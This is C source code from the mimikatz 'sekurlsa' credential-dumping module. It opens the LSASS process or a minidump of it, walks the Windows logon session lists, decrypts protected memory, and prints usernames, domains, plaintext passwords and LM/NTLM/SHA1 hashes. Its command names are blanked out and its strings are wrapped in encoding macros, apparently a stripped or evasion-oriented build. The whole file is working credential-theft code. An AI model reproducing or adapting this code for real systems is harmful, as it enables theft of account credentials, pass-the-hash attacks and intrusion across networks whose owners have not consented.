/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "winapi.h"
#include "kuhl_m_sekurlsa.h"
#include "core\string_crypt.h"

const KUHL_M_C kuhl_m_c_sekurlsa[] = {
/*
	{kuhl_m_sekurlsa_msv,		L"msv",				L"Lists LM & NTLM credentials"},
	{kuhl_m_sekurlsa_wdigest,	L"wdigest",			L"Lists WDigest credentials"},
	{kuhl_m_sekurlsa_kerberos,	L"kerberos",		L"Lists Kerberos credentials"},
	{kuhl_m_sekurlsa_tspkg,		L"tspkg",			L"Lists TsPkg credentials"},
	{kuhl_m_sekurlsa_livessp,	L"livessp",			L"Lists LiveSSP credentials"},
	{kuhl_m_sekurlsa_ssp,		L"ssp",				L"Lists SSP credentials"},
*/
//	{kuhl_m_sekurlsa_all,		L"logonPasswords",	L"Lists all available providers credentials"},
	{kuhl_m_sekurlsa_all,		0,	0},
/*
	{kuhl_m_sekurlsa_strings,	L"searchPasswords",	L"Search in LSASS memory segments some credentials"},

	{kuhl_m_sekurlsa_process,	L"process",			L"Switch (or reinit) to LSASS process  context"},
	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},

	{kuhl_m_sekurlsa_msv_pth,			L"pth",		L"Pass-the-hash"},
	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
*/
};

const KUHL_M kuhl_m_sekurlsa = {
//	L"sekurlsa",	L"SekurLSA module",	L"Some commands to enumerate credentials...",
	0,	0,	0,
	sizeof(kuhl_m_c_sekurlsa) / sizeof(KUHL_M_C), kuhl_m_c_sekurlsa, kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
};

const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
	&kuhl_m_sekurlsa_msv_package,
	&kuhl_m_sekurlsa_tspkg_package,
	&kuhl_m_sekurlsa_wdigest_package,
	&kuhl_m_sekurlsa_livessp_package,
	&kuhl_m_sekurlsa_kerberos_package,
	&kuhl_m_sekurlsa_ssp_package,
	&kuhl_m_sekurlsa_dpapi_svc_package,
};

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_5) , FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_5, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , pSid)},
	{sizeof(KIWI_MSV1_0_LIST_6) , FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_6, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , pSid)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid)}
};

const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
	{kuhl_m_sekurlsa_nt5_init,	kuhl_m_sekurlsa_nt5_clean,	kuhl_m_sekurlsa_nt5_acquireKeys,	&kuhl_m_sekurlsa_nt5_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory},
	{kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
	{kuhl_m_sekurlsa_nt63_init,	kuhl_m_sekurlsa_nt63_clean,	kuhl_m_sekurlsa_nt63_acquireKeys,	&kuhl_m_sekurlsa_nt63_pLsaProtectMemory,&kuhl_m_sekurlsa_nt63_pLsaUnprotectMemory},
};

const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
KUHL_M_SEKURLSA_CONTEXT cLsass = {NULL, {0, 0, 0}};
wchar_t * pMinidumpName = NULL;

VOID kuhl_m_sekurlsa_reset()
{
/*
	HANDLE toClose;
	ULONG i;

	free(pMinidumpName);
	pMinidumpName = NULL;
	if(cLsass.hLsassMem)
	{
		switch(cLsass.hLsassMem->type)
		{
		case KULL_M_MEMORY_TYPE_PROCESS:
			toClose = cLsass.hLsassMem->pHandleProcess->hProcess;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS_DMP:
			toClose = cLsass.hLsassMem->pHandleProcessDmp->hMinidump;
			break;
		default:
			;
		}
		cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
		CloseHandle(toClose);
	}
	for(i = 0; i < sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE); i++)
		RtlZeroMemory(&lsassPackages[i]->Module, sizeof(KUHL_M_SEKURLSA_LIB));
*/
}

NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
{
/*
	kprintf(L"Switch to PROCESS\n");
	kuhl_m_sekurlsa_reset();
*/
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
{
/*
	kprintf(L"Switch to MINIDUMP\n");
	if(argc != 1)
		PRINT_ERROR(L"<minidumpfile.dmp> argument is missing\n");
	else
	{
		kuhl_m_sekurlsa_reset();
		pMinidumpName = _wcsdup(argv[0]);
	}
*/
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_init()
{
	lsassLocalHelper = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : ((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2]);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_clean()
{
	return lsassLocalHelper->cleanLocalLib();
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_range(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aBuffer = {NULL, &hBuffer};
	KULL_M_MEMORY_ADDRESS aLsassMem = {NULL, (PKULL_M_MEMORY_HANDLE) pvArg};
	PBYTE pZone;
	PUNICODE_STRING donnees;

	if((pMemoryBasicInformation->Protect & PAGE_READWRITE) && !(pMemoryBasicInformation->Protect & PAGE_GUARD) && (pMemoryBasicInformation->Type == MEM_PRIVATE))
	{
		aLsassMem.address = pMemoryBasicInformation->BaseAddress;
		if(aBuffer.address = API(KERNEL32, LocalAlloc)(LPTR, pMemoryBasicInformation->RegionSize))
		{
			if(kull_m_memory_copy(&aBuffer, &aLsassMem, pMemoryBasicInformation->RegionSize))
			{
				for(pZone = (PBYTE) aBuffer.address; pZone < (PBYTE) aBuffer.address + pMemoryBasicInformation->RegionSize; pZone += sizeof(LONG))
				{
					donnees = (PUNICODE_STRING) pZone;
					if(kull_m_string_suspectUnicodeStringStructure(&donnees[0]) && kull_m_string_suspectUnicodeStringStructure(&donnees[1]) && kull_m_string_suspectUnicodeStringStructure(&donnees[2]))
						kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) donnees, NULL, KUHL_SEKURLSA_CREDS_DISPLAY_LINE | KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY | KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE, NULL, NULL);
				}
			}
			API(KERNEL32, LocalFree)(aBuffer.address);
		}
	}
	return TRUE;
}

NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(lsassPackages, sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE), NULL, NULL);
}

NTSTATUS kuhl_m_sekurlsa_strings(int argc, wchar_t * argv[])
{
/*
	if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()))
		kull_m_process_getMemoryInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_enum_range, (PVOID) cLsass.hLsassMem);
*/
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	NTSTATUS status = STATUS_SUCCESS;
	KULL_M_MEMORY_TYPE Type;
	HANDLE hData = NULL;
	DWORD pid;
	PMINIDUMP_SYSTEM_INFO pInfos;
	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
	if(!cLsass.hLsassMem)
	{
		status = STATUS_NOT_FOUND;
		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
		{
			if(pMinidumpName)
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
				hData = API(KERNEL32, CreateFileW)(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			}
			else
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS;
				if(kull_m_process_getProcessIdForName(_WCS_("lsass.exe"), &pid))
					hData = API(KERNEL32, OpenProcess)(processRights, FALSE, pid);
				else PRINT_ERROR(L"LSASS process not found (?)\n");
			}

			if(hData && hData != INVALID_HANDLE_VALUE)
			{
				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
				{
					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
					{
						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
						{
							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;

							if(cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION)
								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
						#ifdef _M_X64
							if(pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
						#elif defined _M_IX86
							if(pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL)
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
						#endif
						}
						else PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
					}
					else
					{
						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
					}
					kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
					kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);

					if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
					{
						kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
						if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
						{
							status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);

							if(!NT_SUCCESS(status))
								PRINT_ERROR(L"Key import\n");
						}
						else PRINT_ERROR(L"Logon list\n");
					}
					else PRINT_ERROR(L"Modules informations\n");
				}
				else PRINT_ERROR(L"Memory opening\n");
			}
			else PRINT_ERROR(L"Handle of memory : %08x\n", GetLastError());

			if(!NT_SUCCESS(status))
			{
				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
				API(KERNEL32, CloseHandle)(hData);
			}
		}
		else PRINT_ERROR(L"Local LSA library failed\n");
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for(i = 0; i < sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE); i++)
	{
		if(/*lsassPackages[i]->isValid &&*/ (API(NTDLL, _wcsicmp)(DECODE_STRINGW(lsassPackages[i]->ModuleName), pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0))
		{
			lsassPackages[i]->Module.isPresent = TRUE;
			lsassPackages[i]->Module.Informations = *pModuleInformation;
			break;
		}
	}
	return TRUE;
}

NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
{
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 0, i;
	PVOID pStruct;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &hLocalMemory}, aBuffer = {NULL, &hLocalMemory};
	BOOL retCallback = TRUE;
	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
	NTSTATUS status;
	status = kuhl_m_sekurlsa_acquireLSA();

	if(NT_SUCCESS(status))
	{
		sessionData.cLsass = &cLsass;
		sessionData.lsassLocalHelper = lsassLocalHelper;

		if(cLsass.osContext.MajorVersion < 6)
			helper = &lsassEnumHelpers[0];
		else if(cLsass.osContext.MinorVersion < 2)
			helper = &lsassEnumHelpers[1];
		else if(cLsass.osContext.MinorVersion < 3)
			helper = &lsassEnumHelpers[2];
		else
			helper = &lsassEnumHelpers[3];

		securityStruct.hMemory = cLsass.hLsassMem;
		securityStruct.address = LogonSessionListCount;
		
		if(securityStruct.address)
			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
		else *(PULONG) data.address = 1;

		for(i = 0; i < nbListes; i++)
		{
			securityStruct.address = &LogonSessionList[i];
			data.address = &pStruct;
			data.hMemory = &hLocalMemory;
			if(aBuffer.address = API(KERNEL32, LocalAlloc)(LPTR, helper->tailleStruct))
			{
				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
				{
					data.address = pStruct;
					data.hMemory = securityStruct.hMemory;

					while((data.address != securityStruct.address) && retCallback)
					{
						if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
						{
							sessionData.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper->offsetToLuid);
							sessionData.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToLogonType));
							sessionData.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToSession));
							sessionData.UserName	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToUsername);
							sessionData.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
							sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper->offsetToCredentials);
							sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper->offsetToPSid);

							kull_m_string_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
							kull_m_string_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
							kuhl_m_sekurlsa_utils_getSid(&sessionData.pSid, cLsass.hLsassMem);

							retCallback = callback(&sessionData, pOptionalData);

							API(KERNEL32, LocalFree)(sessionData.UserName->Buffer);
							API(KERNEL32, LocalFree)(sessionData.LogonDomain->Buffer);
							API(KERNEL32, LocalFree)(sessionData.pSid);

							data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
						}
						else break;
					}
				}
				API(KERNEL32, LocalFree)(aBuffer.address);
			}
		}
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
	ULONG i;
	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
	{
		kuhl_m_sekurlsa_printinfos_logonData(pData);
		for(i = 0; i < pLsassData->nbPackages; i++)
		{
			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
			{
				kprintf(_WCS_("\t%s :\t"), pLsassData->lsassPackages[i]->Name);
				pLsassData->lsassPackages[i]->CredsForLUIDFunc(&cLsass, pData->LogonId, pData->pCredentials, pLsassData->externalCallback, pLsassData->externalCallbackData);
				kprintf(_WCS_("\n"));
			}
		}
	}
	return TRUE;
}

void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	wchar_t * sidStr;
	kprintf(_WCS_("\nAuthentication Id : %u ; %u (%08x:%08x)\nSession           : %s from %u\nUser Name         : %s\nDomain            : %s\nSID               : ")
		, pData->LogonId->HighPart, pData->LogonId->LowPart, pData->LogonId->HighPart, pData->LogonId->LowPart, DECODE_STRINGW(KUHL_M_SEKURLSA_LOGON_TYPE[pData->LogonType]), pData->Session, pData->UserName ? pData->UserName->Buffer : _WCS_("(null)"), pData->LogonDomain ? pData->LogonDomain->Buffer  : _WCS_("(null)") );

	if(pData->pSid)
	{
		if(API(ADVAPI32, ConvertSidToStringSidW)(pData->pSid, &sidStr))
		{
			kprintf(_WCS_("%s"), sidStr);
			API(KERNEL32, LocalFree)(sidStr);
		}
	}
	kprintf(_WCS_("\n"));
}

NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
{
	KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages, externalCallback, externalCallbackData};
	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
}

VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
{
	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
	PVOID base;
	DWORD type;
	
	if(mesCreds)
	{
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
			credentials = (PUNICODE_STRING) mesCreds;
			if(credentials->Buffer)
			{
				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
					(*lsassLocalHelper->pLsaUnprotectMemory)(((PUNICODE_STRING) mesCreds)->Buffer, ((PUNICODE_STRING) mesCreds)->Length);

				switch(type)
				{
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;

					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);
					if(externalCallback)
						externalCallback(luid, &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName, NULL, pPrimaryCreds->LmOwfPassword, pPrimaryCreds->NtOwfPassword, externalCallbackData);

					kprintf(_WCS_("\n\t * Username : %s\n\t * Domain   : %s")
						, pPrimaryCreds->UserName.Buffer, pPrimaryCreds->LogonDomainName.Buffer );

					kprintf(_WCS_("\n\t * LM       : ")); kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					kprintf(_WCS_("\n\t * NTLM     : ")); kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
					kprintf(_WCS_("\n\t * SHA1     : ")); kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL);
					kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key1, &base);
					kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key2, &base);
					break;
				default:
					kprintf(_WCS_("\n\t * Raw data : "));
					kull_m_string_wprintf_hex(credentials->Buffer, credentials->Length, 1);
				}
			}
		}
		else
		{
			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if(kull_m_string_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if(kull_m_string_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
					password = &mesCreds->Password;
				}

				if(externalCallback)
					externalCallback(luid, username, domain, password, NULL, NULL, externalCallbackData);

				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
				{
					kprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						_WCS_("%s\t%s\t")
						:
						_WCS_("\n\t * Username : %s\n\t * Domain   : %s\n\t * Password : ")
						, username ? username->Buffer : _WCS_("(null)"), domain ? domain->Buffer : _WCS_("(null)"));

					if(!password || kull_m_string_suspectUnicodeString(password))
						kprintf(_WCS_("%s"), password ? password->Buffer : _WCS_("(null)") );
					else 
						kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
				}

				API(KERNEL32, LocalFree)(mesCreds->UserName.Buffer);
				API(KERNEL32, LocalFree)(mesCreds->Domaine.Buffer);
				API(KERNEL32, LocalFree)(mesCreds->Password.Buffer);
			}
		}
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
			kprintf(_WCS_("\n"));
	}
	else kprintf(_WCS_("LUID KO\n"));
}

VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
{
	switch(key->unkId)
	{
	case 0x00010002:
		kprintf(_WCS_("\n\t * NTLM     : "));
		break;
	case 0x00020002:
		kprintf(_WCS_("\n\t * SHA1     : "));
		break;
	case 0x00030002:
		kprintf(_WCS_("\n\t * RootKey  : "));
		break;
	case 0x00040002:
		kprintf(_WCS_("\n\t * DPAPI    : "));
		break;
	default:
		kprintf(_WCS_("\n\t * %08x : "), key->unkId);
	}
	kull_m_string_wprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
}